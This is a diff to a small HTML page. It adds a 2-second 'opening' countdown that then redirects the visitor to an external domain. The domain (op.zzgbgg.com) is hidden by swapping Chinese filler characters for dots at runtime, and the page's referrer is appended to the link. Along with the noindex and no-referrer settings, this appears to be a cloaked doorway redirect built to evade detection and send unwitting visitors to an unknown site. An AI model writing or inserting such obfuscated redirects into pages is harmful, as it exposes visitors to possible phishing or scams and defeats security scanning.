@@ -1,25 +1,52 @@
 <!DOCTYPE html>
 <html>
+
 <head>
 	<meta charset="utf-8">
-    <title>....</title>
-    <meta name="robots" content="noindex,nofollow">
+	<title>....</title>
+	<meta name="robots" content="noindex,nofollow">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
 	<meta name="renderer" content="webkit">
 	<meta name="HandheldFriendly" content="true">
 	<meta name="referrer" content="no-referrer">
 </head>
-<body>
-    <script>document.writeln('<h2 style="margin-top:40vh;text-align:center">正在打开</h2>')</script>
+
+<body onload="time()">
+	<script>document.writeln('<h2 style="margin-top:40vh;text-align:center">正在打开<span id="second">2s</span></h2>')</script>
+	<script>
+		function time() {
+			var sec = document.getElementById("second");
+			var i = 2;
+			var timer = setInterval(function () {
+				i--;
+				sec.innerHTML = i + "s";
+				if (i == 0) {
+					clearInterval(timer);
+					var strU = "https";
+					strU += "://";
+					strU += "";
+					var ul = 'op其德隆东墙zzgbgg其德隆东墙com?style=1&id=393858936';
+					strU2 = ul.replace(/其德隆东墙/g, '.');
+					strU += strU2;
+					window.location.href = strU + '?' + document.referrer;
+				}
+			}, 1000);
+
+			function goBack() {
+				window.history.go(-1);
+			}
+		}
+	</script>
 	<!-- Google tag (gtag.js) -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=G-E1KT7J4JNW"></script>
 	<script>
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
+		window.dataLayer = window.dataLayer || [];
+		function gtag() { dataLayer.push(arguments); }
+		gtag('js', new Date());
 
-	gtag('config', 'G-E1KT7J4JNW');
+		gtag('config', 'G-E1KT7J4JNW');
 	</script>
 </body>
+
 </html>
